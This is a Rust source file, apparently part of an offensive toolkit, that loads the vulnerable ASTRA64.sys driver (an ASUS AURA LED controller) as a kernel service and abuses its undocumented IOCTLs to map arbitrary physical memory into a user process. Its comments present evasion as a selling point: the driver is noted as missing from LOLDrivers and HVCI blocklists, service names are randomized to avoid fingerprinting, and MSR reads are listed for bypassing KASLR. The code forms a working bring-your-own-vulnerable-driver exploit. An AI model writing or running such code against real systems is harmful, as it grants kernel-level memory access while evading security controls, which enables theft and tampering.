// ─── Backend 4: ASTRA64 ─────────────────────────────────────────────────────
//
// ASUS AURA LED controller driver (EnTech Taiwan). Maps physical memory into
// the calling process's usermode address space via ZwMapViewOfSection on
// \Device\PhysicalMemory. Zero access control beyond admin-level CreateFileW.
//
// Key advantages over SIVX64/ASMMAP64:
//   - NOT on LOLDrivers or HVCI blocklist (stealth advantage)
//   - Usermode mapping enables SIMD scanning without per-read IOCTL overhead
//   - No range restrictions (unlike AsIO3's g_goodRanges)
//   - Additional capabilities: MSR read (KASLR bypass), Port I/O, PCI config
//   - Maps into calling process VA space — direct pointer dereference, no copy
//
// Device path: \\.\Astra32Device0 (driver creates devices 0..15)
//
// IOCTL 0x80002008 — PHYS_MAP: Map physical memory to usermode VA
//   Input struct (24 bytes):
//     +0x00  [u32] flags             — 1 = map request
//     +0x04  [u32] bus_type          — 0 = ISA/default (for HalTranslateBusAddress)
//     +0x08  [i64] physical_address  — target physical address
//     +0x10  [u32] reserved          — 0
//     +0x14  [u32] length            — bytes to map
//   Output (8 bytes): mapped usermode virtual address (pointer-sized)
//
// IOCTL 0x8000200c — PHYS_UNMAP: Release previously mapped region
//   Input (8 bytes): [u64] VA returned by PHYS_MAP
//   Output: none
//
// Internal mechanism:
//   ZwOpenSection(\Device\PhysicalMemory) → HalTranslateBusAddress →
//   ZwMapViewOfSection into user process → return VA

const ASTRA_IOCTL_MAP: u32 = 0x80002008;
const ASTRA_IOCTL_UNMAP: u32 = 0x8000200C;

/// Default path to the ASTRA64.sys driver binary
const ASTRA_DEFAULT_PATH: &str = r"D:\Project\toolkit\drivers\Vulnerable-Monitors\ASTRA64.sys";
/// Alternative fallback path (relative)
const ASTRA_ALT_PATH: &str = r"drivers\ASTRA64.sys";

pub struct Astra64Backend {
    handle: isize,
    available: bool,
    pub last_error: Option<String>,
    service_name: Option<String>,
}

impl Astra64Backend {
    pub fn new() -> Self {
        Self::with_path(ASTRA_DEFAULT_PATH)
    }

    pub fn with_path(sys_path: &str) -> Self {
        // Check if driver file exists
        let path = if std::path::Path::new(sys_path).exists() {
            sys_path.to_string()
        } else if std::path::Path::new(ASTRA_ALT_PATH).exists() {
            ASTRA_ALT_PATH.to_string()
        } else {
            return Astra64Backend {
                handle: INVALID_HANDLE,
                available: false,
                last_error: Some(format!("Driver binary not found at {}", sys_path)),
                service_name: None,
            };
        };

        // ASTRA64 does NOT require SeLoadDriverPrivilege — no access control checks
        // beyond admin-level CreateFileW. No privilege enable needed.

        // Try opening device first (maybe already loaded from a previous session)
        let device_path = to_wide(r"\\.\Astra32Device0");
        let h = unsafe {
            CreateFileW(
                device_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null(),
            )
        };

        if h != INVALID_HANDLE {
            log("[astra64] Device already loaded");
            return Astra64Backend {
                handle: h, available: true, last_error: None, service_name: None,
            };
        }

        // Need to load the driver via sc create/start
        log("[astra64] Loading driver via sc create/start...");

        // Canonicalize path for sc binpath
        let abs_path = match std::fs::canonicalize(&path) {
            Ok(p) => p.to_string_lossy().to_string(),
            Err(e) => {
                return Astra64Backend {
                    handle: INVALID_HANDLE,
                    available: false,
                    last_error: Some(format!("Cannot resolve path: {}", e)),
                    service_name: None,
                };
            }
        };

        // Strip UNC prefix (\\?\) that canonicalize adds on Windows
        let abs_path = abs_path.strip_prefix(r"\\?\").unwrap_or(&abs_path).to_string();

        // Clean up any stale astra32 service (the driver's default service name)
        run_sc(&["stop", "astra32"]);
        run_sc(&["delete", "astra32"]);
        thread::sleep(Duration::from_millis(300));

        // Randomized service name to reduce fingerprinting
        let svc_name = generate_service_name();
        log(&format!("[astra64] Using service name: {}", svc_name));

        // Create kernel service
        let created = run_sc(&[
            "create", &svc_name, "type=", "kernel", "binpath=", &abs_path,
        ]);
        if !created {
            return Astra64Backend {
                handle: INVALID_HANDLE,
                available: false,
                last_error: Some("sc create failed (need admin?)".into()),
                service_name: None,
            };
        }

        // Start the service
        let started = run_sc(&["start", &svc_name]);
        if !started {
            run_sc(&["delete", &svc_name]);
            return Astra64Backend {
                handle: INVALID_HANDLE,
                available: false,
                last_error: Some("sc start failed (driver blocked by HVCI/DSE?)".into()),
                service_name: None,
            };
        }

        // Wait for device symlinks to appear (driver creates 16 device objects)
        thread::sleep(Duration::from_millis(500));

        // Open device — ASTRA64 creates Astra32Device0..15, we use device 0
        let h = unsafe {
            CreateFileW(
                device_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null(),
            )
        };

        if h == INVALID_HANDLE {
            let err = unsafe { GetLastError() };
            run_sc(&["stop", &svc_name]);
            run_sc(&["delete", &svc_name]);
            return Astra64Backend {
                handle: INVALID_HANDLE,
                available: false,
                last_error: Some(format!("Device open failed after load, error {}", err)),
                service_name: None,
            };
        }

        log("[astra64] Driver loaded and device opened");
        Astra64Backend {
            handle: h, available: true, last_error: None, service_name: Some(svc_name),
        }
    }

    /// Issue IOCTL_PHYS_UNMAP (0x8000200C) to release a mapped region.
    /// MUST be called after every successful map to prevent kernel pool exhaustion.
    fn unmap(handle: isize, va: u64) {
        let input = va.to_le_bytes();
        let mut returned: u32 = 0;
        unsafe {
            DeviceIoControl(
                handle, ASTRA_IOCTL_UNMAP,
                input.as_ptr(), 8,
                ptr::null_mut(), 0,
                &mut returned, ptr::null(),
            );
        }
    }
}

impl PhysMemReader for Astra64Backend {
    fn name(&self) -> &str { "ASTRA64" }

    fn is_available(&self) -> bool { self.available }

    fn read_phys(&self, addr: u64, size: u32) -> Result<Vec<u8>, String> {
        if !self.available {
            return Err("ASTRA64 not available".into());
        }

        if size == 0 {
            return Ok(Vec::new());
        }

        // IOCTL_PHYS_MAP (0x80002008)
        // Input buffer layout (24 bytes total):
        //   +0x00  u32 flags            = 1 (map request)
        //   +0x04  u32 bus_type         = 0 (ISA/default for HalTranslateBusAddress)
        //   +0x08  i64 physical_address = target physical address
        //   +0x10  u32 reserved         = 0
        //   +0x14  u32 length           = bytes to map
        let mut input = [0u8; 24];
        input[0..4].copy_from_slice(&1u32.to_le_bytes());           // flags = 1
        input[4..8].copy_from_slice(&0u32.to_le_bytes());           // bus_type = 0
        input[8..16].copy_from_slice(&(addr as i64).to_le_bytes()); // physical address
        input[16..20].copy_from_slice(&0u32.to_le_bytes());         // reserved
        input[20..24].copy_from_slice(&size.to_le_bytes());         // length

        let mut output = [0u8; 8];
        let mut returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                self.handle, ASTRA_IOCTL_MAP,
                input.as_ptr(), 24,
                output.as_mut_ptr(), 8,
                &mut returned, ptr::null(),
            )
        };

        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(format!("ASTRA64 map failed at 0x{:X}+{}, error {}", addr, size, err));
        }

        // Output is the mapped usermode virtual address (pointer-sized on x64)
        let mapped_va = u64::from_le_bytes(output);
        if mapped_va == 0 {
            return Err(format!("ASTRA64 returned null mapping for 0x{:X}", addr));
        }

        // Sanity: must be in usermode address space (below kernel boundary)
        if mapped_va > 0x7FFFFFFFFFFF {
            // Still unmap to avoid kernel pool leak, then return error
            Self::unmap(self.handle, mapped_va);
            return Err(format!(
                "ASTRA64 returned kernel-space pointer 0x{:X}, refusing to dereference",
                mapped_va
            ));
        }

        // Copy data from the mapped region (direct pointer access — the key
        // difference from SIVX64 which does kernel-side copy to IOCTL buffer)
        let mut result = vec![0u8; size as usize];
        unsafe {
            ptr::copy_nonoverlapping(
                mapped_va as *const u8,
                result.as_mut_ptr(),
                size as usize,
            );
        }

        // MUST unmap to prevent kernel pool exhaustion
        Self::unmap(self.handle, mapped_va);

        Ok(result)
    }
}

impl Drop for Astra64Backend {
    fn drop(&mut self) {
        if self.handle != INVALID_HANDLE {
            unsafe { CloseHandle(self.handle); }
        }
        // Cleanup: stop and delete the kernel service we created
        if let Some(ref name) = self.service_name {
            run_sc(&["stop", name]);
            run_sc(&["delete", name]);
            log(&format!("[astra64] Service '{}' stopped and deleted", name));
        }
    }
}
